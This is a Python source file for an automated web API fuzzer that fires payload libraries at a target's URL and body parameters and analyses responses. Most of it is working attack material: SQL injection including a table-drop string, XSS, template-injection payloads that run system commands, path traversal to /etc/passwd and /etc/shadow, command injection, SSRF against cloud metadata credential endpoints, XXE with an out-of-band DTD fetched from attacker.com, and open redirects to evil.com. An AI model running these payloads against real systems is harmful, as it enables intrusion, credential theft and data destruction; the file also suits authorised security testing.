import subprocess
import json
import re
import time
import random
import string
import requests
import concurrent.futures
from typing import Optional, Any
from pydantic import BaseModel, Field, validator

# ══════════════════════════════════════════════════════════════
# 1. SCHEMAS
# ══════════════════════════════════════════════════════════════

class APIFuzzRequest(BaseModel):
    tool: str
    target: str
    args: list[str] = []
    timeout: int = Field(default=600, ge=30, le=7200)
    endpoints: list[str] = []
    headers: dict[str, str] = {}
    wordlist: Optional[str] = None
    methods: list[str] = ["GET", "POST", "PUT", "DELETE", "PATCH", "OPTIONS"]
    content_types: list[str] = [
        "application/json",
        "application/x-www-form-urlencoded",
        "multipart/form-data",
        "text/xml",
        "application/xml",
        "text/plain",
    ]
    params: dict[str, str] = {}         # baseline params to fuzz
    body: Optional[str] = None          # baseline body to fuzz

    @validator("tool")
    def validate_tool(cls, v):
        allowed = {"ffuf", "nuclei", "manual"}
        if v not in allowed:
            raise ValueError(f"Tool '{v}' not allowed. Use: {allowed}")
        return v

    @validator("target")
    def validate_target(cls, v):
        blocked = ["127.0.0.1", "localhost", "0.0.0.0", "::1"]
        if v.strip() in blocked:
            raise ValueError(f"Target '{v}' is blocked")
        domain  = r"^https?://[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}"
        bare    = r"^[a-zA-Z0-9]([a-zA-Z0-9\-]*\.)+[a-zA-Z]{2,}$"
        ip_http = r"^https?://(\d{1,3}\.){3}\d{1,3}"
        if not (re.match(domain, v) or re.match(bare, v)
                or re.match(ip_http, v)):
            raise ValueError(f"Invalid target: {v}")
        return v.strip()

    @validator("args")
    def validate_args(cls, v):
        dangerous = [";", "&&", "||", "|", "`", "$(", ">>", "'", '"']
        blocked   = ["-o", "--output", "-O", "-od"]
        for arg in v:
            for c in dangerous:
                if c in arg:
                    raise ValueError(f"Dangerous char '{c}' in: {arg}")
            for f in blocked:
                if arg.strip() == f:
                    raise ValueError(f"Blocked flag: {f}")
        return v

    @validator("methods")
    def validate_methods(cls, v):
        allowed = {"GET", "POST", "PUT", "DELETE", "PATCH",
                   "OPTIONS", "HEAD", "TRACE", "CONNECT"}
        return [m.upper() for m in v if m.upper() in allowed]


# ── Single fuzz result ──
class FuzzResult(BaseModel):
    url: str
    method: str
    payload: str
    payload_type: str                   # sqli / xss / ssti / overflow /
                                        # method / content_type / param / path
    param_name: Optional[str] = None
    status_code: Optional[int] = None
    content_length: Optional[int] = None
    response_time: Optional[float] = None
    content_type: Optional[str] = None
    redirect_url: Optional[str] = None
    response_snippet: Optional[str] = None
    error_detected: bool = False
    interesting: bool = False
    finding_type: str = "none"          # error / injection / method_allowed /
                                        # content_type_bypass / path_traversal /
                                        # overflow / info_leak
    severity: str = "info"
    evidence: list[str] = []


# ── Parameter analysis ──
class ParamFuzzSummary(BaseModel):
    param_name: str
    endpoint: str
    total_payloads: int = 0
    interesting_responses: list[FuzzResult] = []
    error_responses: list[FuzzResult] = []
    anomalies: list[str] = []
    vulnerable: bool = False
    vuln_types: list[str] = []


# ── Method fuzz result ──
class MethodFuzzResult(BaseModel):
    endpoint: str
    methods_tested: list[str] = []
    methods_allowed: list[str] = []
    methods_unexpected: list[str] = []   # allowed but shouldn't be
    options_response: Optional[str] = None
    vulnerable: bool = False
    evidence: list[str] = []


# ── Content-type fuzz result ──
class ContentTypeFuzzResult(BaseModel):
    endpoint: str
    method: str
    results: list[FuzzResult] = []
    accepted_types: list[str] = []
    bypassed: bool = False
    evidence: list[str] = []


# ── Final result ──
class APIFuzzingResult(BaseModel):
    success: bool
    tool: str
    target: str
    command: str
    total_requests: int = 0
    total_interesting: int = 0
    total_errors: int = 0
    fuzz_results: list[FuzzResult] = []
    param_summaries: list[ParamFuzzSummary] = []
    method_results: list[MethodFuzzResult] = []
    content_type_results: list[ContentTypeFuzzResult] = []
    critical_findings: list[FuzzResult] = []
    raw_output: Optional[str] = None
    error: Optional[str] = None
    execution_time: float = 0.0
    techniques_used: list[str] = []


# ══════════════════════════════════════════════════════════════
# 2. PAYLOAD LIBRARIES
# ══════════════════════════════════════════════════════════════

# ── SQL Injection ──
SQLI_PAYLOADS: list[dict] = [
    # Classic
    {"payload": "'",                          "label": "sqli_single_quote"},
    {"payload": "''",                         "label": "sqli_double_quote"},
    {"payload": "' OR '1'='1",               "label": "sqli_or_true"},
    {"payload": "' OR '1'='1'--",            "label": "sqli_or_comment"},
    {"payload": "' OR 1=1--",                "label": "sqli_or_int"},
    {"payload": "' OR 1=1#",                 "label": "sqli_or_hash"},
    {"payload": '" OR "1"="1',               "label": "sqli_double_or"},
    {"payload": "1' ORDER BY 1--",           "label": "sqli_order_by"},
    {"payload": "1' ORDER BY 100--",         "label": "sqli_order_by_high"},
    {"payload": "1 UNION SELECT NULL--",     "label": "sqli_union_null"},
    {"payload": "1 UNION SELECT NULL,NULL--","label": "sqli_union_null2"},
    {"payload": "1 UNION SELECT 1,2,3--",   "label": "sqli_union_123"},
    # Error-based
    {"payload": "1 AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))--",
     "label": "sqli_error_mysql"},
    {"payload": "1 AND 1=CONVERT(int,(SELECT TOP 1 name FROM sysobjects))--",
     "label": "sqli_error_mssql"},
    {"payload": "1 AND 1=(SELECT 1 FROM(SELECT COUNT(*),CONCAT(VERSION(),"
                "FLOOR(RAND(0)*2))x FROM information_schema.tables "
                "GROUP BY x)a)--",
     "label": "sqli_error_group"},
    # Blind
    {"payload": "1 AND SLEEP(3)--",          "label": "sqli_time_sleep"},
    {"payload": "1; WAITFOR DELAY '0:0:3'--","label": "sqli_time_waitfor"},
    {"payload": "1 AND 1=1",                 "label": "sqli_blind_true"},
    {"payload": "1 AND 1=2",                 "label": "sqli_blind_false"},
    {"payload": "1' AND SLEEP(3)--",         "label": "sqli_time_str"},
    # NoSQL
    {"payload": '{"$gt": ""}',               "label": "nosql_gt"},
    {"payload": '{"$ne": null}',             "label": "nosql_ne"},
    {"payload": '{"$where": "sleep(3000)"}',"label": "nosql_where_sleep"},
    {"payload": "' || '1'=='1",              "label": "nosql_or"},
    {"payload": "[$ne]=1",                   "label": "nosql_ne_param"},
    # ORM
    {"payload": "1 OR 1=1",                  "label": "sqli_orm_or"},
    {"payload": "admin'--",                  "label": "sqli_admin_comment"},
    {"payload": "' HAVING 1=1--",            "label": "sqli_having"},
    {"payload": "'; DROP TABLE users;--",    "label": "sqli_drop"},
    {"payload": "' AND 1=CAST((SELECT "
                "TOP 1 table_name FROM "
                "information_schema.tables) AS int)--",
     "label": "sqli_cast"},
]

# ── XSS ──
XSS_PAYLOADS: list[dict] = [
    {"payload": "<script>alert(1)</script>",         "label": "xss_script"},
    {"payload": "<img src=x onerror=alert(1)>",      "label": "xss_img"},
    {"payload": "<svg onload=alert(1)>",             "label": "xss_svg"},
    {"payload": "javascript:alert(1)",               "label": "xss_javascript"},
    {"payload": '"><script>alert(1)</script>',       "label": "xss_break_attr"},
    {"payload": "'><script>alert(1)</script>",       "label": "xss_break_sq"},
    {"payload": "</script><script>alert(1)</script>","label": "xss_close_script"},
    {"payload": "<ScRiPt>alert(1)</sCrIpT>",         "label": "xss_case"},
    {"payload": "%3Cscript%3Ealert(1)%3C/script%3E", "label": "xss_url_enc"},
    {"payload": "&#60;script&#62;alert(1)&#60;/script&#62;","label": "xss_html_enc"},
    {"payload": "<img src=x onerror=alert`1`>",      "label": "xss_template"},
    {"payload": "<details open ontoggle=alert(1)>",  "label": "xss_details"},
    {"payload": "<body onload=alert(1)>",            "label": "xss_body"},
    {"payload": '"><img src=x onerror=alert(1)>',   "label": "xss_break_img"},
    # DOM
    {"payload": "#<script>alert(1)</script>",        "label": "xss_dom_hash"},
    {"payload": "javascript:void(alert(1))",         "label": "xss_void"},
    # Filter bypass
    {"payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
     "label": "xss_nested"},
    {"payload": "<svg><script>alert(1)</script></svg>","label": "xss_svg_script"},
    {"payload": "<iframe src=javascript:alert(1)>",  "label": "xss_iframe"},
    {"payload": "<input autofocus onfocus=alert(1)>","label": "xss_autofocus"},
]

# ── SSTI (Server Side Template Injection) ──
SSTI_PAYLOADS: list[dict] = [
    # Generic detection
    {"payload": "{{7*7}}",                   "label": "ssti_jinja2_basic"},
    {"payload": "${7*7}",                    "label": "ssti_java_el"},
    {"payload": "#{7*7}",                    "label": "ssti_ruby_erb"},
    {"payload": "<%= 7*7 %>",               "label": "ssti_erb_basic"},
    {"payload": "*{7*7}",                   "label": "ssti_spring"},
    {"payload": "{{7*'7'}}",               "label": "ssti_jinja2_str"},
    {"payload": "${{7*7}}",                 "label": "ssti_twig"},
    {"payload": "{7*7}",                    "label": "ssti_freemarker"},
    {"payload": "{{config}}",              "label": "ssti_jinja2_config"},
    {"payload": "{{self._TemplateReference__context.cycler.__init__"
                ".__globals__.os.popen('id').read()}}",
     "label": "ssti_jinja2_rce"},
    # Jinja2
    {"payload": "{{''.__class__.__mro__[1].__subclasses__()}}",
     "label": "ssti_jinja2_subclasses"},
    {"payload": "{{request.application.__globals__.__builtins__"
                ".__import__('os').popen('id').read()}}",
     "label": "ssti_jinja2_os"},
    # Twig
    {"payload": "{{_self.env.registerUndefinedFilterCallback('exec')}}"
                "{{_self.env.getFilter('id')}}",
     "label": "ssti_twig_exec"},
    # Freemarker
    {"payload": "<#assign ex=\"freemarker.template.utility.Execute\"?new()>"
                "${ex('id')}",
     "label": "ssti_freemarker_exec"},
    # Velocity
    {"payload": "#set($str=$class.inspect('java.lang.String').type)"
                "#set($chr=$class.inspect('java.lang.Character').type)"
                "#set($ex=$class.inspect('java.lang.Runtime').type.getRuntime())"
                "$ex.exec('id')",
     "label": "ssti_velocity"},
    # Expression Language
    {"payload": "${T(java.lang.Runtime).getRuntime().exec('id')}",
     "label": "ssti_spring_rce"},
    {"payload": "T(java.lang.Runtime).getRuntime().exec('id')",
     "label": "ssti_el_runtime"},
]

# ── Path Traversal / LFI ──
PATH_TRAVERSAL_PAYLOADS: list[dict] = [
    {"payload": "../../../etc/passwd",         "label": "lfi_passwd"},
    {"payload": "../../etc/passwd",            "label": "lfi_passwd2"},
    {"payload": "../etc/passwd",               "label": "lfi_passwd3"},
    {"payload": "/etc/passwd",                 "label": "lfi_passwd_abs"},
    {"payload": "....//....//....//etc/passwd","label": "lfi_double_dot"},
    {"payload": "..%2F..%2F..%2Fetc%2Fpasswd","label": "lfi_url_enc"},
    {"payload": "%2e%2e%2f%2e%2e%2fetc%2fpasswd","label": "lfi_double_url"},
    {"payload": "..%252F..%252Fetc%252Fpasswd","label": "lfi_double_enc"},
    {"payload": "..\\..\\..\\windows\\win.ini","label": "lfi_windows"},
    {"payload": "..\\..\\..\\.\\etc\\passwd",  "label": "lfi_backslash"},
    {"payload": "/proc/self/environ",          "label": "lfi_environ"},
    {"payload": "/proc/self/cmdline",          "label": "lfi_cmdline"},
    {"payload": "/etc/shadow",                 "label": "lfi_shadow"},
    {"payload": "/etc/hosts",                  "label": "lfi_hosts"},
    {"payload": "file:///etc/passwd",          "label": "lfi_file_scheme"},
    {"payload": "php://filter/convert.base64-encode/resource=index.php",
     "label": "lfi_php_filter"},
    {"payload": "php://input",                 "label": "lfi_php_input"},
    {"payload": "expect://id",                 "label": "lfi_expect"},
    {"payload": "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
     "label": "lfi_data_b64"},
]

# ── Command Injection ──
CMDI_PAYLOADS: list[dict] = [
    {"payload": "; id",                       "label": "cmdi_semicolon"},
    {"payload": "| id",                       "label": "cmdi_pipe"},
    {"payload": "|| id",                      "label": "cmdi_or"},
    {"payload": "& id",                       "label": "cmdi_amp"},
    {"payload": "&& id",                      "label": "cmdi_and"},
    {"payload": "`id`",                       "label": "cmdi_backtick"},
    {"payload": "$(id)",                      "label": "cmdi_dollar"},
    {"payload": "; sleep 3",                  "label": "cmdi_sleep"},
    {"payload": "| sleep 3",                  "label": "cmdi_pipe_sleep"},
    {"payload": "& ping -c 3 127.0.0.1 &",   "label": "cmdi_ping"},
    {"payload": "; cat /etc/passwd",          "label": "cmdi_passwd"},
    {"payload": "%0aid",                      "label": "cmdi_newline"},
    {"payload": "%0a id %0a",                 "label": "cmdi_newline2"},
    {"payload": "${IFS}id",                   "label": "cmdi_ifs"},
    {"payload": "1;id",                       "label": "cmdi_inline"},
    # Windows
    {"payload": "| dir",                      "label": "cmdi_win_dir"},
    {"payload": "& ipconfig",                 "label": "cmdi_win_ipconfig"},
    {"payload": "; timeout 3",                "label": "cmdi_win_timeout"},
]

# ── Buffer Overflow / Overflow ──
OVERFLOW_PAYLOADS: list[dict] = [
    {"payload": "A" * 100,                   "label": "overflow_100"},
    {"payload": "A" * 500,                   "label": "overflow_500"},
    {"payload": "A" * 1000,                  "label": "overflow_1k"},
    {"payload": "A" * 5000,                  "label": "overflow_5k"},
    {"payload": "A" * 10000,                 "label": "overflow_10k"},
    {"payload": "A" * 65535,                 "label": "overflow_64k"},
    {"payload": "%n" * 100,                  "label": "overflow_format_n"},
    {"payload": "%s" * 100,                  "label": "overflow_format_s"},
    {"payload": "%x" * 100,                  "label": "overflow_format_x"},
    {"payload": "0" * 1000,                  "label": "overflow_zeros"},
    {"payload": "\x00" * 100,               "label": "overflow_null"},
    {"payload": "\xff" * 100,               "label": "overflow_ff"},
    {"payload": "-1",                        "label": "overflow_neg"},
    {"payload": "2147483647",               "label": "overflow_int_max"},
    {"payload": "2147483648",               "label": "overflow_int_overflow"},
    {"payload": "-2147483649",              "label": "overflow_int_underflow"},
    {"payload": "9999999999999999999",       "label": "overflow_bignum"},
    {"payload": "0.0000000000000001",        "label": "overflow_float_tiny"},
    {"payload": "999999999999999.9999",      "label": "overflow_float_big"},
    {"payload": "NaN",                       "label": "overflow_nan"},
    {"payload": "Infinity",                  "label": "overflow_inf"},
    {"payload": "null",                      "label": "type_null"},
    {"payload": "true",                      "label": "type_bool_true"},
    {"payload": "false",                     "label": "type_bool_false"},
    {"payload": "[]",                        "label": "type_array"},
    {"payload": "{}",                        "label": "type_object"},
]

# ── SSRF ──
SSRF_PAYLOADS: list[dict] = [
    {"payload": "http://169.254.169.254/latest/meta-data/",
     "label": "ssrf_aws_metadata"},
    {"payload": "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
     "label": "ssrf_aws_iam"},
    {"payload": "http://metadata.google.internal/computeMetadata/v1/",
     "label": "ssrf_gcp_metadata"},
    {"payload": "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
     "label": "ssrf_azure_metadata"},
    {"payload": "http://localhost:80",        "label": "ssrf_localhost_80"},
    {"payload": "http://localhost:8080",      "label": "ssrf_localhost_8080"},
    {"payload": "http://localhost:22",        "label": "ssrf_localhost_22"},
    {"payload": "http://0.0.0.0:80",          "label": "ssrf_zero_80"},
    {"payload": "http://127.0.0.1",           "label": "ssrf_loopback"},
    {"payload": "http://[::1]",               "label": "ssrf_ipv6_loopback"},
    {"payload": "http://2130706433",          "label": "ssrf_decimal_loopback"},
    {"payload": "http://0177.0.0.1",          "label": "ssrf_octal_loopback"},
    {"payload": "dict://localhost:11211/",    "label": "ssrf_dict_memcache"},
    {"payload": "gopher://localhost:6379/_PING","label": "ssrf_gopher_redis"},
    {"payload": "file:///etc/passwd",         "label": "ssrf_file"},
    {"payload": "http://localtest.me",        "label": "ssrf_dns_rebind"},
    {"payload": "http://spoofed.burpcollaborator.net",
     "label": "ssrf_oob_burp"},
]

# ── XXE ──
XXE_PAYLOADS: list[dict] = [
    {"payload": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",
     "label": "xxe_file_read"},
    {"payload": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>
<foo>&xxe;</foo>""",
     "label": "xxe_ssrf"},
    {"payload": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]>
<foo>test</foo>""",
     "label": "xxe_oob"},
    {"payload": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
<foo>&xxe;</foo>""",
     "label": "xxe_php_filter"},
    {"payload": """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>
<foo>&xxe;</foo>""",
     "label": "xxe_shadow"},
    {"payload": """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE test [<!ENTITY % init SYSTEM "data://text/plain;base64,
ZmlsZTovLy9ldGMvcGFzc3dk"> %init; ]><foo/>""",
     "label": "xxe_base64"},
]

# ── Open Redirect ──
OPEN_REDIRECT_PAYLOADS: list[dict] = [
    {"payload": "https://evil.com",            "label": "redirect_external"},
    {"payload": "//evil.com",                  "label": "redirect_protocol"},
    {"payload": "///evil.com",                 "label": "redirect_triple_slash"},
    {"payload": "////evil.com",                "label": "redirect_quad_slash"},
    {"payload": "/\\evil.com",                 "label": "redirect_backslash"},
    {"payload": "https:evil.com",              "label": "redirect_colon"},
    {"payload": "https://evil.com%2F@target",  "label": "redirect_at"},
    {"payload": "javascript:alert(1)",         "label": "redirect_javascript"},
    {"payload": "data:text/html,<script>alert(1)</script>",
     "label": "redirect_data"},
    {"payload": "%2Fevil.com",                 "label": "redirect_enc_slash"},
    {"payload": "%252Fevil.com",               "label": "redirect_dbl_enc"},
]

# ── HTTP Methods to fuzz ──
ALL_HTTP_METHODS = [
    "GET", "POST", "PUT", "PATCH", "DELETE",
    "OPTIONS", "HEAD", "TRACE", "CONNECT",
    "PROPFIND", "PROPPATCH", "MKCOL", "COPY",
    "MOVE", "LOCK", "UNLOCK", "SEARCH",
    "PURGE", "INVALIDATE", "DEBUG",
]

# ── Content-Types to fuzz ──
CONTENT_TYPES_TO_FUZZ = [
    "application/json",
    "application/x-www-form-urlencoded",
    "multipart/form-data",
    "text/xml",
    "application/xml",
    "application/soap+xml",
    "text/plain",
    "text/html",
    "application/javascript",
    "application/octet-stream",
    "application/graphql",
    "application/ld+json",
    "application/vnd.api+json",
    "application/x-protobuf",
    "application/msgpack",
    "application/cbor",
    "charset=utf-8",
    "application/json; charset=utf-8",
    "application/json; charset=utf-16",
    "*/*",
    "",
]

# ── Error signatures ──
ERROR_SIGNATURES: dict[str, list[str]] = {
    "sql_error": [
        "sql syntax", "mysql_fetch", "ora-0", "postgresql error",
        "sqlite3", "pg_query", "sqlexception", "unclosed quotation",
        "quoted string not properly terminated", "syntax error",
        "invalid input syntax", "division by zero",
        "column.*does not exist", "table.*doesn't exist",
        "you have an error in your sql",
    ],
    "code_error": [
        "traceback (most recent call last)",
        "exception in thread", "nullpointerexception",
        "undefined method", "undefined variable",
        "fatal error", "parse error", "stack trace",
        "at java.lang", "at org.springframework",
        "system.exception", "unhandled exception",
        "warning: include", "failed to open stream",
    ],
    "ssti_success": [
        "49",                  # 7*7 result
        "7777777",             # 7*'7' in Python
    ],
    "path_traversal": [
        "root:x:0:0", "daemon:x:", "nobody:x:",
        "[fonts]", "[extensions]",              # windows ini
        "uid=", "gid=",                         # id command output
    ],
    "command_injection": [
        "uid=", "gid=", "root:", "www-data",
        "total ", "drwxr", "-rw-r",
    ],
    "ssrf_success": [
        "ami-id", "instance-id", "local-ipv4",  # AWS metadata
        "computeMetadata",                       # GCP
        "access_token", "expires_on",            # Azure
    ],
}

# Status codes that are interesting during fuzzing
INTERESTING_STATUS = {
    200, 201, 202, 204,                          # success
    301, 302, 307, 308,                          # redirects
    400, 401, 403, 405, 406, 415, 422, 429,     # client errors
    500, 501, 502, 503,                          # server errors
}

VULN_STATUS = {200, 201, 500, 501}              # most interesting for vulns


# ══════════════════════════════════════════════════════════════
# 3. PAYLOAD BUILDER
# ══════════════════════════════════════════════════════════════

ALL_PAYLOAD_SETS: dict[str, list[dict]] = {
    "sqli":          SQLI_PAYLOADS,
    "xss":           XSS_PAYLOADS,
    "ssti":          SSTI_PAYLOADS,
    "path_traversal":PATH_TRAVERSAL_PAYLOADS,
    "cmdi":          CMDI_PAYLOADS,
    "overflow":      OVERFLOW_PAYLOADS,
    "ssrf":          SSRF_PAYLOADS,
    "xxe":           XXE_PAYLOADS,
    "open_redirect": OPEN_REDIRECT_PAYLOADS,
}


def build_payload_list(
    categories: Optional[list[str]] = None,
    limit_per_category: int = 20,
) -> list[tuple[str, str, str]]:
    """
    Build (payload, label, category) tuples.
    If categories=None, use all categories.
    """
    payloads: list[tuple[str, str, str]] = []
    cats = categories or list(ALL_PAYLOAD_SETS.keys())

    for cat in cats:
        pset = ALL_PAYLOAD_SETS.get(cat, [])
        for item in pset[:limit_per_category]:
            payloads.append((item["payload"], item["label"], cat))

    return payloads


def random_string(length: int = 8) -> str:
    """Generate random string for baseline comparisons."""
    return "".join(random.choices(string.ascii_lowercase, k=length))


# ══════════════════════════════════════════════════════════════
# 4. RESPONSE ANALYZER
# ══════════════════════════════════════════════════════════════

def analyze_response(
    url: str,
    method: str,
    payload: str,
    payload_type: str,
    label: str,
    resp_status: Optional[int],
    resp_body: Optional[str],
    resp_headers: dict[str, str],
    resp_time: float,
    baseline_status: Optional[int] = None,
    baseline_body: Optional[str] = None,
    baseline_len: Optional[int] = None,
    param_name: Optional[str] = None,
) -> FuzzResult:
    """
    Analyze a fuzz response for:
    - Error signatures
    - Payload reflection
    - Status code anomalies
    - Response time anomalies (time-based injection)
    - Size anomalies
    """
    result = FuzzResult(
        url=url,
        method=method,
        payload=payload[:200],
        payload_type=payload_type,
        param_name=param_name,
        status_code=resp_status,
        content_length=len(resp_body) if resp_body else 0,
        response_time=resp_time,
        content_type=resp_headers.get("content-type", ""),
        response_snippet=(resp_body or "")[:300],
    )

    # Redirect
    if resp_status in (301, 302, 307, 308):
        result.redirect_url = resp_headers.get("location")

    body_lower = (resp_body or "").lower()
    evidence: list[str] = []

    # ── Error signature detection ──
    for err_type, patterns in ERROR_SIGNATURES.items():
        for pattern in patterns:
            if re.search(pattern, body_lower, re.IGNORECASE):
                result.error_detected = True
                result.interesting    = True

                if err_type == "sql_error":
                    result.finding_type = "sql_injection"
                    result.severity     = "critical"
                    evidence.append(f"SQL error signature: '{pattern}'")

                elif err_type == "code_error":
                    result.finding_type = "code_disclosure"
                    result.severity     = "high"
                    evidence.append(f"Code error: '{pattern}'")

                elif err_type == "ssti_success":
                    if payload_type == "ssti":
                        result.finding_type = "ssti"
                        result.severity     = "critical"
                        evidence.append(f"SSTI result: '{pattern}' in response")

                elif err_type == "path_traversal":
                    result.finding_type = "path_traversal"
                    result.severity     = "critical"
                    evidence.append(f"File content leaked: '{pattern}'")

                elif err_type == "command_injection":
                    result.finding_type = "command_injection"
                    result.severity     = "critical"
                    evidence.append(f"Command output: '{pattern}'")

                elif err_type == "ssrf_success":
                    result.finding_type = "ssrf"
                    result.severity     = "critical"
                    evidence.append(f"SSRF metadata leaked: '{pattern}'")

                break

    # ── Payload reflection (XSS) ──
    if payload_type == "xss" and payload[:20] in (resp_body or ""):
        result.interesting  = True
        result.finding_type = "xss_reflection"
        result.severity     = "high"
        evidence.append(f"XSS payload reflected in response")

    # ── Time-based injection ──
    if resp_time and resp_time > 2.8:
        if any(kw in label for kw in ("sleep", "waitfor", "time", "delay")):
            result.interesting  = True
            result.finding_type = "time_based_injection"
            result.severity     = "high"
            evidence.append(
                f"Response time {resp_time:.2f}s > 2.8s with time payload"
            )

    # ── Status code anomaly ──
    if baseline_status and resp_status:
        if baseline_status in (401, 403) and resp_status in (200, 201, 204):
            result.interesting  = True
            result.finding_type = "auth_bypass"
            result.severity     = "critical"
            evidence.append(
                f"Status changed from {baseline_status} to {resp_status} "
                f"with payload"
            )
        elif resp_status == 500 and baseline_status != 500:
            result.interesting  = True
            result.finding_type = "server_error"
            result.severity     = "medium"
            evidence.append(f"500 error triggered by payload")

    # ── Size anomaly ──
    if baseline_len and result.content_length:
        diff = abs(result.content_length - baseline_len)
        if diff > 500 and diff > baseline_len * 0.5:
            result.interesting = True
            evidence.append(
                f"Response size anomaly: baseline={baseline_len}, "
                f"fuzzed={result.content_length} (diff={diff})"
            )

    # ── SSRF redirect ──
    if payload_type == "ssrf" and result.redirect_url:
        if any(kw in result.redirect_url for kw in
               ("169.254", "metadata", "localhost", "127.0.0.1")):
            result.interesting  = True
            result.finding_type = "ssrf"
            result.severity     = "critical"
            evidence.append(f"SSRF redirect: {result.redirect_url}")

    # ── Open redirect ──
    if payload_type == "open_redirect" and result.redirect_url:
        if "evil.com" in result.redirect_url or "attacker" in result.redirect_url:
            result.interesting  = True
            result.finding_type = "open_redirect"
            result.severity     = "medium"
            evidence.append(f"Open redirect to: {result.redirect_url}")

    # ── Mark all 5xx with payloads as interesting ──
    if resp_status and resp_status >= 500 and not result.interesting:
        result.interesting = True
        if not result.finding_type or result.finding_type == "none":
            result.finding_type = "server_error"
            result.severity     = "low"
        evidence.append(f"HTTP {resp_status} response to payload")

    result.evidence = evidence
    return result


# ══════════════════════════════════════════════════════════════
# 5. FUZZ ENGINES
# ══════════════════════════════════════════════════════════════

def fuzz_url_params(
    url: str,
    method: str,
    existing_params: dict[str, str],
    headers: dict[str, str],
    payloads: list[tuple[str, str, str]],
    timeout: int = 8,
) -> list[FuzzResult]:
    """
    Fuzz URL query parameters with all payloads.
    1. Get baseline response
    2. Replace each param value with each payload
    3. Analyze differences
    """
    results: list[FuzzResult] = []

    # Baseline
    try:
        baseline = requests.request(
            method, url, params=existing_params,
            headers=headers, timeout=timeout, verify=False,
        )
        bl_status = baseline.status_code
        bl_body   = baseline.text[:3000]
        bl_len    = len(baseline.content)
    except Exception:
        bl_status, bl_body, bl_len = None, None, None

    # Fuzz each param
    params_to_fuzz = list(existing_params.keys()) if existing_params \
        else ["id", "user", "file", "url", "path", "q", "search",
              "page", "redirect", "next", "data"]

    for param in params_to_fuzz:
        for payload, label, cat in payloads:
            fuzz_params = {**existing_params, param: payload}
            start = time.time()
            try:
                resp = requests.request(
                    method, url, params=fuzz_params,
                    headers=headers, timeout=timeout,
                    verify=False, allow_redirects=False,
                )
                elapsed = round(time.time() - start, 3)
                result  = analyze_response(
                    url=f"{url}?{param}={payload[:30]}",
                    method=method,
                    payload=payload,
                    payload_type=cat,
                    label=label,
                    resp_status=resp.status_code,
                    resp_body=resp.text[:3000],
                    resp_headers={k.lower(): v for k, v in resp.headers.items()},
                    resp_time=elapsed,
                    baseline_status=bl_status,
                    baseline_body=bl_body,
                    baseline_len=bl_len,
                    param_name=param,
                )
                if result.interesting or result.error_detected:
                    results.append(result)

            except requests.exceptions.Timeout:
                # Timeout itself might indicate blind injection
                if any(kw in label for kw in ("sleep", "time", "delay", "waitfor")):
                    results.append(FuzzResult(
                        url=url, method=method,
                        payload=payload[:100], payload_type=cat,
                        param_name=param,
                        response_time=timeout,
                        interesting=True,
                        finding_type="time_based_injection",
                        severity="high",
                        evidence=[f"Timeout on time-based payload: {label}"],
                    ))
            except Exception:
                pass

    return results


def fuzz_body_params(
    url: str,
    method: str,
    base_body: Optional[str],
    content_type: str,
    headers: dict[str, str],
    payloads: list[tuple[str, str, str]],
    timeout: int = 8,
) -> list[FuzzResult]:
    """
    Fuzz request body parameters.
    Handles JSON, form-encoded, XML bodies.
    """
    results: list[FuzzResult] = []

    req_headers = {
        **headers,
        "Content-Type": content_type,
    }

    # Parse baseline body
    body_fields: dict[str, Any] = {}
    body_type = "raw"

    if base_body:
        if "json" in content_type:
            try:
                body_fields = json.loads(base_body)
                body_type   = "json"
            except Exception:
                pass
        elif "x-www-form-urlencoded" in content_type:
            from urllib.parse import parse_qs, urlencode
            parsed = parse_qs(base_body)
            body_fields = {k: v[0] for k, v in parsed.items()}
            body_type   = "form"
    else:
        # Default fields to fuzz
        body_fields = {
            "id": "1", "user": "admin", "username": "admin",
            "email": "test@test.com", "url": "http://example.com",
            "file": "test.txt", "path": "/", "data": "test",
            "query": "test", "search": "test", "input": "test",
        }
        body_type = "json"

    # Baseline request
    try:
        if body_type == "json":
            bl_resp = requests.request(
                method, url, json=body_fields,
                headers=req_headers, timeout=timeout, verify=False,
            )
        else:
            bl_resp = requests.request(
                method, url, data=body_fields,
                headers=req_headers, timeout=timeout, verify=False,
            )
        bl_status = bl_resp.status_code
        bl_body   = bl_resp.text[:3000]
        bl_len    = len(bl_resp.content)
    except Exception:
        bl_status, bl_body, bl_len = None, None, None

    # Fuzz each field
    for field in list(body_fields.keys()):
        for payload, label, cat in payloads:
            fuzz_fields = {**body_fields, field: payload}
            start = time.time()
            try:
                if body_type == "json":
                    resp = requests.request(
                        method, url, json=fuzz_fields,
                        headers=req_headers, timeout=timeout,
                        verify=False, allow_redirects=False,
                    )
                else:
                    resp = requests.request(
                        method, url, data=fuzz_fields,
                        headers=req_headers, timeout=timeout,
                        verify=False, allow_redirects=False,
                    )
                elapsed = round(time.time() - start, 3)
                result  = analyze_response(
                    url=url,
                    method=method,
                    payload=payload,
                    payload_type=cat,
                    label=label,
                    resp_status=resp.status_code,
                    resp_body=resp.text[:3000],
                    resp_headers={k.lower(): v for k, v in resp.headers.items()},
                    resp_time=elapsed,
                    baseline_status=bl_status,
                    baseline_body=bl_body,
                    baseline_len=bl_len,
                    param_name=field,
                )
                if result.interesting or result.error_detected:
                    results.append(result)

            except requests.exceptions.Timeout:
                if any(kw in label for kw in ("sleep", "time", "delay", "waitfor")):
                    results.append(FuzzResult(
                        url=url, method=method,
                        payload=payload[:100], payload_type=cat,
                        param_name=field,
                        response_time=timeout,
                        interesting=True,
                        finding_type="time_based_injection",
                        severity="high",
                        evidence=[
                            f"Body field '{field}': timeout on "
                            f"time-based payload '{label}'"
                        ],
                    ))
            except Exception:
                pass

    return results
